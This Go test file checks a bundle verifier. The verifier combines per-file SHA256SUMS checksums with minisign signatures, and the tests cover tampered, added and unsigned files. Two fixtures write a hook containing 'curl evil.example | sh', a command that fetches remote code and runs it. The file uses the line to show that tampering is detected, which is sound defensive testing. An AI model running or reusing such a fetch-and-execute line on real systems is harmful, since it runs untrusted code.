package suite

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"os"
	"path/filepath"
	"testing"

	gominisign "github.com/jedisct1/go-minisign"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/morzecrew/morzer/internal/adapters/verify"
	"github.com/morzecrew/morzer/internal/adapters/verify/checksum"
	"github.com/morzecrew/morzer/internal/adapters/verify/minisign"
	"github.com/morzecrew/morzer/internal/domain"
	"github.com/morzecrew/morzer/internal/infra/atomicfs"
	"github.com/morzecrew/morzer/internal/ports"
	"github.com/morzecrew/morzer/test/contract"
)

// signBundle does what a vendor's release pipeline does: write a SHA256SUMS
// listing every file, sign it, and leave both in the bundle.
//
// Signing here uses the same library the verifier reads with. That is a real
// weakness of the test -- a bug shared by both halves would pass -- and the
// mitigation is that the format is minisign's, checkable by the `minisign`
// binary against the same files, rather than something invented here.
func signBundle(t *testing.T, bundleDir string) string {
	t.Helper()

	// The suite asks for a signed bundle at a path that may not exist yet,
	// when it wants a signature by an unrelated key.
	if _, err := os.Stat(bundleDir); err != nil {
		require.NoError(t, atomicfs.CopyTree(
			testBundlePath(t), bundleDir, atomicfs.DefaultExtractLimits()))
	}

	writeSumsFile(t, bundleDir)

	sk, publicKey := minisignKeypair(t)

	sumsPath := filepath.Join(bundleDir, ports.SumsFileName)
	sig, err := sk.SignFile(sumsPath, gominisign.SignOptions{})
	require.NoError(t, err)

	encoded, err := sig.MarshalText()
	require.NoError(t, err)
	require.NoError(t, os.WriteFile(
		filepath.Join(bundleDir, ports.SignatureFileName), encoded, 0o644))

	return publicKey
}

// minisignKeypair builds an unencrypted minisign key.
//
// The library reads keys rather than creating them -- the manager only ever
// verifies -- so the test assembles one from an Ed25519 key and encodes the
// public half the way minisign does: algorithm, key id, key, base64. Forty-two
// bytes, and the same bytes `minisign -G` would print.
func minisignKeypair(t *testing.T) (sk gominisign.PrivateKey, publicKey string) {
	t.Helper()

	_, priv, err := ed25519.GenerateKey(rand.Reader)
	require.NoError(t, err)

	var keyID [8]byte
	_, err = rand.Read(keyID[:])
	require.NoError(t, err)

	sk = gominisign.PrivateKey{
		SignatureAlgorithm: [2]byte{'E', 'd'},
		ChecksumAlgorithm:  [2]byte{'B', '2'},
		KeyId:              keyID,
	}
	copy(sk.SecretKey[:], priv)

	pk := sk.PublicKey()
	blob := make([]byte, 0, 42)
	blob = append(blob, pk.SignatureAlgorithm[:]...)
	blob = append(blob, pk.KeyId[:]...)
	blob = append(blob, pk.PublicKey[:]...)

	return sk, base64.StdEncoding.EncodeToString(blob)
}

// writeSumsFile produces the per-file checksum manifest in `sha256sum` format,
// so a third party can check it without this tool.
func writeSumsFile(t *testing.T, dir string) {
	t.Helper()

	var out []byte
	require.NoError(t, filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return err
		}
		rel, err := filepath.Rel(dir, path)
		if err != nil {
			return err
		}
		// The sums file cannot list itself, and the signature covers the
		// sums file rather than the other way round.
		if rel == ports.SumsFileName || rel == ports.SignatureFileName {
			return nil
		}
		digest, err := atomicfs.DigestFile(path)
		if err != nil {
			return err
		}
		out = append(out, []byte(digest[len("sha256:"):]+"  "+filepath.ToSlash(rel)+"\n")...)
		return nil
	}))

	require.NoError(t, os.WriteFile(filepath.Join(dir, ports.SumsFileName), out, 0o644))
}

// noSignature is the signer for verifiers that do not read one.
func noSignature(t *testing.T, bundleDir string) string {
	t.Helper()
	return ""
}

func TestVerifierContract_Checksum(t *testing.T) {
	// It knows nothing about signatures, deliberately: policy lives in one
	// adapter so two cannot disagree about it.
	contract.RunVerifierSuite(t, testBundlePath(t),
		contract.VerifierClaims{Digest: true, Contents: true},
		func(t *testing.T) ports.Verifier { return checksum.New() }, noSignature)
}

func TestVerifierContract_Minisign(t *testing.T) {
	// No Contents claim, and that is the point. The signature covers
	// SHA256SUMS, not each file, so this verifier cannot see a hook edited
	// without its checksum entry being edited too -- which is exactly why
	// the two compose rather than one replacing the other.
	contract.RunVerifierSuite(t, testBundlePath(t),
		contract.VerifierClaims{Signature: true},
		func(t *testing.T) ports.Verifier { return minisign.New() }, signBundle)
}

// The chain is what production wires, and it is the only thing that claims
// everything. A composite that dropped a member would otherwise pass every test
// its remaining members pass.
func TestVerifierContract_Chain(t *testing.T) {
	contract.RunVerifierSuite(t, testBundlePath(t),
		contract.VerifierClaims{Digest: true, Contents: true, Signature: true},
		func(t *testing.T) ports.Verifier {
			return verify.NewChain(checksum.New(), minisign.New())
		}, signBundle)
}

// signedBundle copies the example bundle somewhere writable and signs it,
// returning the directory and the public key.
func signedBundle(t *testing.T) (dir, publicKey string) {
	t.Helper()
	dir = filepath.Join(t.TempDir(), "bundle")
	require.NoError(t, atomicfs.CopyTree(testBundlePath(t), dir, atomicfs.DefaultExtractLimits()))
	return dir, signBundle(t, dir)
}

func TestSignatureVerification(t *testing.T) {
	ctx := context.Background()
	v := verify.NewChain(checksum.New(), minisign.New())

	t.Run("a good signature passes", func(t *testing.T) {
		dir, key := signedBundle(t)
		require.NoError(t, v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
			PublicKeys: []string{key},
			Required:   true,
		}))
	})

	t.Run("the wrong key is refused", func(t *testing.T) {
		dir, _ := signedBundle(t)

		_, otherKey := minisignKeypair(t)

		err := v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
			PublicKeys: []string{otherKey},
			Required:   true,
		})
		require.Error(t, err, "a signature by a key this machine does not trust must be refused")
		assert.Contains(t, err.Error(), "does not verify")
	})

	t.Run("a tampered file is caught by the sums the signature covers", func(t *testing.T) {
		dir, key := signedBundle(t)

		// The signature still verifies -- SHA256SUMS is untouched -- so
		// this is the case that proves the two verifiers actually
		// compose. Signature alone would pass it.
		hook := filepath.Join(dir, "hooks", "migrate")
		require.NoError(t, os.WriteFile(hook, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o755))

		err := v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
			PublicKeys: []string{key},
			Required:   true,
		})
		require.Error(t, err, "a file changed after signing must be refused")
		assert.Contains(t, err.Error(), "SHA256SUMS")
	})

	// The attack the per-file list is supposed to stop, in the form that
	// editing nothing: a mirror *adds* a file. The signature still verifies
	// because SHA256SUMS is untouched, every listed file still matches, and
	// with no --expect-digest there is no independent digest to compare
	// against -- so completeness is the only thing left that can refuse it.
	t.Run("a file added after signing is refused even though the signature verifies", func(t *testing.T) {
		dir, key := signedBundle(t)

		planted := filepath.Join(dir, "hooks", "backdoor")
		require.NoError(t, os.WriteFile(planted, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o755))

		// The signature is genuinely still good: this is not a test of a
		// broken signature.
		require.NoError(t, minisign.New().Verify(ctx, ports.BundlePath(dir), ports.Expectation{
			PublicKeys: []string{key}, Required: true,
		}), "adding a file must not disturb the signature -- that is the whole problem")

		err := v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
			PublicKeys: []string{key}, Required: true,
		})
		require.Error(t, err, "a file the signed list does not cover is an unverified file")
		assert.Contains(t, err.Error(), "hooks/backdoor")
		assert.Contains(t, err.Error(), "not listed")
	})

	// A bundle that ships no list at all is a different posture, not a
	// violated one: there is nothing claiming coverage, and the digest is
	// what the caller pins.
	t.Run("a bundle without a sums file is unaffected", func(t *testing.T) {
		dir := filepath.Join(t.TempDir(), "bundle")
		require.NoError(t, atomicfs.CopyTree(testBundlePath(t), dir, atomicfs.DefaultExtractLimits()))

		digest, err := atomicfs.DigestTree(dir)
		require.NoError(t, err)
		require.NoError(t, checksum.New().Verify(ctx, ports.BundlePath(dir),
			ports.Expectation{Digest: digest}))
	})

	t.Run("a tampered sums file breaks the signature", func(t *testing.T) {
		dir, key := signedBundle(t)

		// An attacker who edits a file has to edit SHA256SUMS to match,
		// and cannot then re-sign it. This is the other half of the same
		// chain.
		sums := filepath.Join(dir, ports.SumsFileName)
		data, err := os.ReadFile(sums)
		require.NoError(t, err)
		require.NoError(t, os.WriteFile(sums, append(data, []byte("\n# tampered\n")...), 0o644))

		err = minisign.New().Verify(ctx, ports.BundlePath(dir), ports.Expectation{
			PublicKeys: []string{key},
			Required:   true,
		})
		require.Error(t, err)
		assert.Contains(t, err.Error(), "does not verify")
	})

	t.Run("an unsigned bundle is refused only when the policy requires it", func(t *testing.T) {
		dir := filepath.Join(t.TempDir(), "bundle")
		require.NoError(t, atomicfs.CopyTree(testBundlePath(t), dir, atomicfs.DefaultExtractLimits()))

		_, key := minisignKeypair(t)

		// Keys configured, nothing signed: allowed, because
		// require_signature is the control that makes signing mandatory
		// and it is not set.
		require.NoError(t, v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
			PublicKeys: []string{key},
		}))

		err := v.Verify(ctx, ports.BundlePath(dir), ports.Expectation{
			PublicKeys: []string{key},
			Required:   true,
		})
		require.Error(t, err, "require_signature must refuse a bundle with no signature")
		assert.Contains(t, err.Error(), "requires a signature")
	})

	t.Run("a malformed configured key is a configuration error", func(t *testing.T) {
		dir, _ := signedBundle(t)

		err := minisign.New().Verify(ctx, ports.BundlePath(dir), ports.Expectation{
			PublicKeys: []string{"not-a-minisign-key"},
		})
		require.Error(t, err)
		// "Fix installation.yaml" and "do not install this bundle" are
		// different instructions, and the message has to be the first.
		assert.Contains(t, err.Error(), "signing_keys")
	})
}

// TestRequireSignatureWithoutKeysIsRefusedAtLoad is the fail-closed half of the
// policy. Before this, `require_signature: true` made every operation fail with
// a message about bundles when the problem was one line of configuration.
func TestRequireSignatureWithoutKeysIsRefusedAtLoad(t *testing.T) {
	inst := domain.Installation{
		SchemaVersion: domain.InstallationSchemaVersion,
		ID:            "inst_1",
		Product:       "demo",
		Policy:        domain.Policy{RequireSignature: true},
	}

	err := inst.Validate()
	require.Error(t, err, "a policy nothing could satisfy must be refused where it is written")
	assert.Contains(t, err.Error(), "signing_keys")

	inst.Policy.SigningKeys = []string{"RWQf6LRCGA9i53mlYecO4IzT51TGPpvWucNSCh1CBM0QTaLn73Y7GFO3"}
	require.NoError(t, inst.Validate())
}

func TestEmptyVerifierChainRefusesRatherThanPasses(t *testing.T) {
	// The one failure mode a verification step must not have: verifying
	// everything by verifying nothing.
	err := verify.NewChain().Verify(context.Background(), "irrelevant", ports.Expectation{})
	require.Error(t, err)
}
